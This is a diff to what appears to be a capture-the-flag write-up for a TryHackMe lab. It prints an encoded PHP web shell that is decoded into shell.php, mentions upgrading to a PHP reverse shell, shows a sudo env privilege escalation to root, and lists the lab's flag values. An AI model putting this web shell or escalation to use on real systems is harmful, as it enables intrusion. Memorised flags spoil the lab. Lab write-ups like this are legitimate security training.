@@ -58,4 +58,24 @@
 
     `echo %50%47%5a%76%63%6d%30%67%62%57%56%30%61%47%39%6b%50%53%4a%48%52%56%51%69%49%47%35%68%62%57%55%39%49%6a%77%2f%63%47%68%77%49%47%56%6a%61%47%38%67%59%6d%46%7a%5a%57%35%68%62%57%55%6f%4a%46%39%54%52%56%4a%57%52%56%4a%62%4a%31%42%49%55%46%39%54%52%55%78%47%4a%31%30%70%4f%79%41%2f%50%69%49%2b%43%6a%78%70%62%6e%42%31%64%43%42%30%65%58%42%6c%50%53%4a%55%52%56%68%55%49%69%42%75%59%57%31%6c%50%53%4a%6a%62%57%51%69%49%47%6c%6b%50%53%4a%6a%62%57%51%69%49%48%4e%70%65%6d%55%39%49%6a%67%77%49%6a%34%4b%50%47%6c%75%63%48%56%30%49%48%52%35%63%47%55%39%49%6c%4e%56%51%6b%31%4a%56%43%49%67%64%6d%46%73%64%57%55%39%49%6b%56%34%5a%57%4e%31%64%47%55%69%50%67%6f%38%4c%32%5a%76%63%6d%30%2b%43%6a%78%77%63%6d%55%2b%43%6a%77%2f%63%47%68%77%43%69%41%67%49%43%42%70%5a%69%68%70%63%33%4e%6c%64%43%67%6b%58%30%64%46%56%46%73%6e%59%32%31%6b%4a%31%30%70%4b%51%6f%67%49%43%41%67%65%77%6f%67%49%43%41%67%49%43%41%67%49%48%4e%35%63%33%52%6c%62%53%67%6b%58%30%64%46%56%46%73%6e%59%32%31%6b%4a%31%30%70%4f%77%6f%67%49%43%41%67%66%51%6f%2f%50%67%6f%38%4c%33%42%79%5a%54%34%4b%50%48%4e%6a%63%6d%6c%77%64%44%35%6b%62%32%4e%31%62%57%56%75%64%43%35%6e%5a%58%52%46%62%47%56%74%5a%57%35%30%51%6e%6c%4a%5a%43%67%69%59%32%31%6b%49%69%6b%75%5a%6d%39%6a%64%58%4d%6f%4b%54%73%38%4c%33%4e%6a%63%6d%6c%77%64%44%34%3d | base64 -d > shell.php`
 
-8. 
+8. This wasn't working right to get a reverse shell, but I was able to use it to create a reverse shell via encoding the reverse shell from here: http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+
+    `echo <base64 encoded> | base64 -d > reverse.php`
+
+9. With a reverse shell on the machine, I was able to `cat flag.php` which was in the root of the web, giving me the first flag `THM{Th1s_1s_N0t_4_Catdog_ab67edfa}`
+
+10. Sudo -l revealed:
+
+```
+Matching Defaults entries for www-data on 79ac254749ea:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on 79ac254749ea:
+    (root) NOPASSWD: /usr/bin/env
+```
+
+This allowed me to run `sudo /usr/bin/env /bin/sh` to get a root shell.
+
+11. The third flag was in `/root/flag3.txt`: `THM{D1ff3r3nt_3nv1ronments_874112}`. Still need to find 2 and 4.
+
+12. Browsing into /var/www I found flag2: `THM{LF1_t0_RC3_aec3fb}`. The flag file was `/var/www/flag2_QMW7JvaY2LvK.txt`
